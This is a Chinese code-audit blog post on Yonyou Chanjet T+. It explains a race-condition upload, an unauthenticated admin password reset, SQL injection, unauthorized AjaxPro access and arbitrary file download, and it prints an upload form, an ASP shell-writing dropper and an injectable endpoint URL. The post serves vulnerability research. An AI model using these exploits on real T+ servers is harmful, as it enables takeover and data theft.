> 原文链接: https://www.anquanke.com//post/id/195226 


# 代码审计入门之用友畅捷通T+代码审计


                                阅读量   
                                **1594970**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01dd0f5c4a22e466ce.jpg)](https://p2.ssl.qhimg.com/t01dd0f5c4a22e466ce.jpg)



## 0x00:前言

畅捷通T+是由用友软件开发的一款新型互联网企业管理软件，全面满足成长型小微企业对其灵活业务流程的管控需求，重点解决往来业务管理、订单跟踪、资金、库存等管理难题。T+结合畅捷通100多万中小企业的管理经验，采用完全B/S结构及.NET先进开发技术，通过解决中小企业管理现状的重点问题，以及对业务过程主要环节的控制与管理，提升管理水平，为企业带来更多管理价值。产品应用功能包括：采购管理、库存核算、销售管理、零售管理、促销管理、会员管理、生产管理、往来现金、固定资产、出纳管理、总账、T-UFO；主要应用于中小商贸企业、工业企业与工贸企业一体化管理。在某次安全评估过程中在内网遇到该系统。遂对该系统进行一次粗略的代码审计分析，来看看这套系统存在哪些问题。



## 0x01:前置知识

在分析代码之前我们先了解一下ASP.NET的一些基础知识和关键信息

ASP.NET 支持三种不同的开发模式：

[![](https://p0.ssl.qhimg.com/t013120ecf962dd70fa.png)](https://p0.ssl.qhimg.com/t013120ecf962dd70fa.png)

Global.asax与Web.config：
|                                  Global.asax|                                 Web.config

Web.config
|Global.asax是一个全局文件，一个ASP.NET的应用程序文件，是从从HttpApplication基类派生的类。响应的是应用程序级别和会话级别事件 ，当需要处理应用程序事件或会话事件时，可建立使用Global.asax文件。|Web.config是一个配置文件，是基于XML的文本文件。通过配置相关节点来实现数据库连接以及身份验证等功能。Web.config文件并不编译进dll文件中，将来有变化时，可直接用记事本打开Web.config文件进行编辑修改，很方便。 

通过配置相关节点来实现数据库连接以及身份验证等功能。

便。

按执行顺序来解释一下Global.asax.cs中相应的事件处理方法的含义：
- Application_BeginRequest：BeginRequest是在收到Request时第一个触发的事件，这个方法自然就是第一个执行的了。
- Application_AuthenticateRequest：当安全模块已经建立了当前用户的标识后执行。
- Application_AuthorizeRequest：当安全模块已经验证了当前用户的授权时执行。
- Application_ResolveRequestCache：当ASP.NET完成授权事件以使缓存模块从缓存中为请求提供服务时发生，从而跳过处理程序（页面或者是WebService）的执行。这样做可以改善网站的性能，这个事件还可以用来判断正文是不是从Cache中得到的。
- Application_AcquireRequestState：当ASP.NET获取当前请求所关联的当前状态（如Session）时执行。
- Application_PreRequestHandlerExecute：当ASP.Net即将把请求发送到处理程序对象（页面或者是WebService）之前执行。这个时候，Session就可以用了。
- Application_PostRequestHandlerExecute：当处理程序对象（页面或者是WebService）工作完成之后执行。
- Application_ReleaseRequestState：在ASP.NET执行完所有请求处理程序后执行。ReleaseRequestState事件将使当前状态数据被保存。
- Application_UpdateRequestCache：在ASP.NET执行完处理程序后，为了后续的请求而更新响应缓存时执行。
- Application_EndRequest：同上，EndRequest是在响应Request时最后一个触发的事件，这个方法自然就是最后一个执行的了。
再附上两个无顺序的，随时都可能执行的：
- Application_PreSendRequestHeaders：向客户端发送Http标头之前执行。
- Application_PreSendRequestContent：向客户端发送Http正文之前执行。
预编译：

ASP.NET在将整个站点提供给用户之前，可以预编译该站点。这为用户提供了更快的响应时间，提供了在向用户显示站点之前标识编译时bug的方法，提供了避免部署源代码的方法，并提供了有效的将站点部署到成品服务器的方法。可以在网站的当前位置预编译网站，也可以预编译网站并将其部署到其他计算机。

部署时不同文件类型对应的预编译操作和输出位置：
|文件类型|预编译操作|输出位置
|.aspx、ascx、.master|生成程序集和一个指向该程序集的.compiled文件。原始文件保留在原位置，作为完成请求的占位符|程序集和.compiled文件写入Bin文件夹中。页（去除内容的.aspx文件）保留在其原始位置
|.asmx、.ashx|生成程序集。原始文件保留在原位置，作为完成请求的占位符|Bin文件夹
|App_Code文件夹中的文件|生成一个或多个程序集（取决于Web.config设置）|Bin文件夹
|未包含在App_Code文件夹中的.cs或.vb文件|与依赖于这些文件的页或资源一起编译|Bin文件夹
|Bin文件夹中的现有.dll文件|按原样复制文件|Bin文件夹
|资源（.resx）文件|对于App_LocalResources或App_GlobalResources文件夹中找到的.resx文件，生成一个或多个程序集以及一个区域性结构|Bin文件夹
|App_Themes文件夹及子文件夹中的文件|在目标位置生成程序集并生成指向这些程序集的.compiled文件|Bin文件夹
|静态文件（.htm、.html、图形文件等）|按原样复制文件|与源中结构相同
|浏览器定义文件|按原样复制文件|App_Browsers
|依赖项目|将依赖项目的输出生成到程序集中|Bin文件夹
|Web.config文件|按原样复制文件|与源中结构相同
|Global.asax文件|编译到程序集中|Bin文件夹

.net反编译相关工具：
- ILSPY
- DNSPY
- .Net Reflector


## 0x02:任意文件上传

从官网下载安装包后我们直接安装即可，然后到安装目录下查看源码。

[![](https://p3.ssl.qhimg.com/t017bc1c89fceee8789.png)](https://p3.ssl.qhimg.com/t017bc1c89fceee8789.png)

打开WebSite目录，查看源码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015cfe02228de59313.png)

观察到所有的aspx文件都只有1kb大小。用编辑器打开看看，寻找引用DLL位置的代码片段。

[![](https://p2.ssl.qhimg.com/t017ea0b1be7154e853.png)](https://p2.ssl.qhimg.com/t017ea0b1be7154e853.png)

打开后发现提示我们源代码已经被预编译处理，那么我们打开bin目录寻找预编译后的DLL文件。通过ILspy反编译dll文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013ee12da342bc6303.png)

我们先从Global.asax文件入手，因为它提供了一些全局可用的方法，通过分析这些方法我们了解得到系统如何是如何配置安全措施。从而帮助我们快速 定位到漏洞触发点。我们先来看看Application.PreRequestHandlerExecute 事件是怎么写的。因为Application.PreRequestHandlerExecute 事件是在ASP.Net即将把请求发送到处理程序对象（页面或者是WebService）之前执行。一般作用于全局，身份校验判断一般都是在其逻辑中实现。

[![](https://p2.ssl.qhimg.com/t0122e062d8936433f5.png)](https://p2.ssl.qhimg.com/t0122e062d8936433f5.png)

先是将sender转换成httpApplication对象，然后取HTTP数据流，然后判断流内容的请求是否为空。然后获取当前请求的虚拟路径。然后将 flag 置为1。

随后判断路径是否为空。

然后判断路径后缀是否在名单内。如果在名单内部就直接跳出。如下所示的页面或满足后缀的页面都直接跳出。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01dccfd315677e6e2d.png)

在这份所谓的名单里我观察到一个疑似存在上传功能的地址，sm/upload/testuploadspeed.aspx 从字面上不难理解这是一个测试上传速度的接口。直

觉告诉我这里存在问题。我们跟进看看代码是怎么写的。

[![](https://p4.ssl.qhimg.com/t010a430204adb83f70.png)](https://p4.ssl.qhimg.com/t010a430204adb83f70.png)

逻辑上很清晰了。取得上传数据然后直接写入Templates目录里去，且写入路径直接拼接文件名，说明写入路径可控。然后马上又调用Delete方法删除文件。看起来貌似很正常的样子，但实际上这里已经出现了严重的安全问题。首先是未限制上传文件的后缀，大概是程序员觉得上传后马上就删除了应该没啥问题。其次是写入路径可控。最后是逻辑顺序设计的不合理，当程序在服务端并发处理用户请求时就会出现问题，如果在文件上传成功后但是在删除它以前这个文件就被执行了那么会怎样呢？

我们假设攻击者上传了一个用来生成恶意shell的文件，在上传完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell文件，后续的一切就都不是问题了。

实际利用过程：

先构造一个上传，然后通过burp重复发包，线程调高一点。

构造页面如下：

```
&lt;html&gt;

&lt;body&gt;

&lt;form action="http://192.168.216.149:8080/tplus/sm/upload/testuploadspeed.aspx" method="post" enctype="multipart/form-data"&gt;

&lt;label for="file"&gt;Filename:&lt;/label&gt;

&lt;input type="file" name="file" id="file" /&gt;

&lt;br /&gt;

&lt;input type="submit" name="submit" value="Submit" /&gt;

&lt;/form&gt;

&lt;/body&gt;

&lt;/html&gt;
```

上传包如下：

[![](https://p1.ssl.qhimg.com/t012c94565efd33ae80.png)](https://p1.ssl.qhimg.com/t012c94565efd33ae80.png)

请求包如下，X参数为我们写入的内容。

[![](https://p1.ssl.qhimg.com/t01a46df2904a41c994.png)](https://p1.ssl.qhimg.com/t01a46df2904a41c994.png)

只要速度够快，就能赶在删除文件之前生成shell

[![](https://p1.ssl.qhimg.com/t01763e5f59ecd2448f.png)](https://p1.ssl.qhimg.com/t01763e5f59ecd2448f.png)

因为整套源码都是已经预编译好的，无法使用ASPX脚本来生成shell（这里踩了很多坑），所以我们这里用的是ASP代码来生成的一句话。代码如下：

```
&lt;%
txtcontent    =  request("x")
PromotionPath = "upload.asp"
WriteToHtml PromotionPath,txtcontent
Function WriteToHtml(Fpath,Templet)
Dim FSO
Dim FCr
Set FSO = CreateObject("Scripting.FileSystemObject")
If FSO.FILEExists(Fpath) Then
FSO.deleteFILE Fpath
End If
Set FCr = FSO.CreateTextFile(Server.MapPath(Fpath), True)
FCr.Write(Templet)
FCr.Close
Set FCr = Nothing
Set FSO = Nothing
End Function
%&gt;
```

由上述过程我们可以看到这种“关门打狗”的处理逻辑在并发的情况下是十分危险的，极易导致条件竞争漏洞的发生。



## 0x03:管理员密码任意重置漏洞

继续观察名单，我发现存在一个recoverpassword.aspx页面，根据命名可以看出这是一个重置密码的页面。我们跟进看看是否存在漏洞。先看Page_Load怎么写的。这里只有一行代码，通过RegisterTypeForAjax注册类信息到前台页面。RecoverPassword就是要调用的类名，一般都是指页面地址。相当于通过前台JS调用后台方法。那么继续往下看

[![](https://p1.ssl.qhimg.com/t01ad73157a6e9292d6.png)](https://p1.ssl.qhimg.com/t01ad73157a6e9292d6.png)

在135行-149之间的SetNewPwd函数，我们可以很明显的看出这是一个重置密码的操作请求。从逻辑上看pwdNew经过encode之后进入到RecoverSystemPassword

我们继续跟进看看。

[![](https://p4.ssl.qhimg.com/t01702a09654d600681.png)](https://p4.ssl.qhimg.com/t01702a09654d600681.png)

这里直接就执行sql语句更新管理员密码了，并没有做其他的校验。很明显我们可以通过ajax调用SetNewPwd函数来修改管理员密码。

[![](https://p1.ssl.qhimg.com/t0163c54268bafd6df6.png)](https://p1.ssl.qhimg.com/t0163c54268bafd6df6.png)

找到调用地址，查看构造方法

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016fe5d45fc14b9948.png)

[![](https://p0.ssl.qhimg.com/t0191152dd9df10dc50.png)](https://p0.ssl.qhimg.com/t0191152dd9df10dc50.png)

通过burp直接POST数据即可重置管理员密码

[![](https://p1.ssl.qhimg.com/t014978e4639a941eed.png)](https://p1.ssl.qhimg.com/t014978e4639a941eed.png)



## 0x04:SQL注入漏洞

从上一个漏洞我们可以看出开发者貌似很喜欢拼接SQL语句，那么这种随意的拼接行为必然会在某处导致SQL注入。我们全局搜索一下（说是全局搜索，其实也就是在业务系统寻找一些请求，然后跟进查看代码是怎么处理的，即黑盒测试）。这里我们在某个类库找到了一个函数，我们来看看开发人员是怎么写的。

[![](https://p3.ssl.qhimg.com/t01450fa2ffc4ff9aaf.png)](https://p3.ssl.qhimg.com/t01450fa2ffc4ff9aaf.png)

第一行没啥说的，我们看第二行，这里scheduleName交给了GetScheduleLog处理，我们继续跟踪GetScheduleLog，可以看到serviceName通过Format()方法直接拼接到SQL语句当中去了。然后后面直接就query了。很明显这里存在注入，我们回过头来看看GetScheduleLogList这个函数是怎

么调用，scheduleName是否可控。

[![](https://p4.ssl.qhimg.com/t0125d01c87448ed2ff.png)](https://p4.ssl.qhimg.com/t0125d01c87448ed2ff.png)

如图所示，从18行开始，我们看代码，这里定义好命名空间以后，通过AjaxNamespace修改命名空间名称，然后在函数前面添加AjaxMethod

关键字，通过查阅资料可以得知。使用AjaxMethod可以在客户端异步调用服务端方法，简单地说就是在JS里调用后台文件里的方法，做一些JS

无法做到的操作，如查询数据库等。那么上面的问题就迎刃而解了，我们通过构造http请求直接调用GetScheduleLogList传入内容即可注入。

[![](https://p2.ssl.qhimg.com/t014b02816a63d3e504.png)](https://p2.ssl.qhimg.com/t014b02816a63d3e504.png)

构造地址：

[http://127.0.0.1/tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList](http://127.0.0.1/tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList)

POST:

`{`“scheduleName”:”DatabaseConsolidationTask”`}`

同理，我发现多处存在原理相同的漏洞，这里我列举几点，就不赘述了。

[![](https://p5.ssl.qhimg.com/t0181635bc337a02c02.png)](https://p5.ssl.qhimg.com/t0181635bc337a02c02.png)

[![](https://p2.ssl.qhimg.com/t011d53f1b678a2f7af.png)](https://p2.ssl.qhimg.com/t011d53f1b678a2f7af.png)

在这里除了SQL注入以外还存在一个问题，那就是未授权访问，我们放在下面单独讲。



## 0x05:接口未授权访问

这里本来是想接着SQL注入继续写的，但是想想似乎可以单独列举出来，于是我们就来单独分析一下。回到0x02，我们继续分析global中的Application.PreRequestHandlerExecute 事件。

[![](https://p2.ssl.qhimg.com/t01a922b9b40cb2a437.png)](https://p2.ssl.qhimg.com/t01a922b9b40cb2a437.png)

通过分析149-186行代码，我们可以很明显的看出这段代码是用来鉴权的，判断用户是否登录。逻辑上并没有什么问题。之前我们说到global是作用全局的，但是凡事都有例外，这里的例外指的就是我们从0x04发现的类库，类库是不收到 global的影响的，这是由类库本身的性质决定的。因为类库为方法的集合。方法只能被调用，并不能通过其他方式直接访问，性质是不可访问响应，而Global的作用就是控制全局响应，这里自然无法产生影响。

这里我抽出一个具体案例分析。还是和0x04一样，我们以GetDefaultBackPath()方法为例，可以看出该方法前面添加了ajaxmethod，这里就代表了这是一个ajax的方法接口，变成可访问的控制器。

[![](https://p4.ssl.qhimg.com/t01bd7c1911e5108716.png)](https://p4.ssl.qhimg.com/t01bd7c1911e5108716.png)

我们刚刚说到global是作用全局的。当类库里的方法变成接口以后，性质从不可访问响应变成可访问响应时，就会受到其影响，但这里开发者在使用ajaxmethod却忘记使用session。常规的做法应该是使用 [Ajax.AjaxMethod(HttpSessionStateRequirement.Read)] 。然后在方法内部进行权限的判断。所以总得来看还是开发者没有正确的使用ajaxmethod有关。

如图，直接构造方法即可调用接口，前面的注入漏洞也是如此。

[![](https://p3.ssl.qhimg.com/t01e0e492eb4e302b42.png)](https://p3.ssl.qhimg.com/t01e0e492eb4e302b42.png)



## 0x06:任意文件下载

我们继续看代码，发现一个疑似提供下载功能的页面。打开来看看

[![](https://p1.ssl.qhimg.com/t018571ddf9fb156656.png)](https://p1.ssl.qhimg.com/t018571ddf9fb156656.png)

打开命名空间，我们来看看实现代码

[![](https://p0.ssl.qhimg.com/t01f577aff41cf84f84.png)](https://p0.ssl.qhimg.com/t01f577aff41cf84f84.png)

我们来看Page_Load函数，首先接收path参数，对内容进行URL解码。然后截取字符串。判断text中是否存在“_”。然后设置HttpResponseBase 类的一些属性值。最后将将指定文件的内容作为文件块写入 HTTP 响应输出流。整个流程没有对Path进行任何的过滤和检查，最后导致任意文件下载。

直接构造路径下载web.config:

[![](https://p3.ssl.qhimg.com/t01d420000571aeee78.png)](https://p3.ssl.qhimg.com/t01d420000571aeee78.png)

注：该请求需要登录，原因上面已经讲到。



## 0x07:总结

纵观整套源码，我们可以发现，常规的用户交互操作都是存在登录校验的。但是开发者却忽略了Ajaxpro这种程序调用接口的安全校验。其实在大多数系统中也存在类似的问题，整套系统存在问题的点还是非常之多的。本文只选取了部分较为明显的点进行分析撰述，并未对该套源码进行全面分析。各位小伙伴感兴趣可以深入研究一下。个人感觉ASP.NET的语法思想和JAVA其实是很相似的。在审计过程中也学习到了很多知识和一些有趣的开发思想，受益匪浅。本文拙劣，行文不当之处希望各位大佬指正谅解。
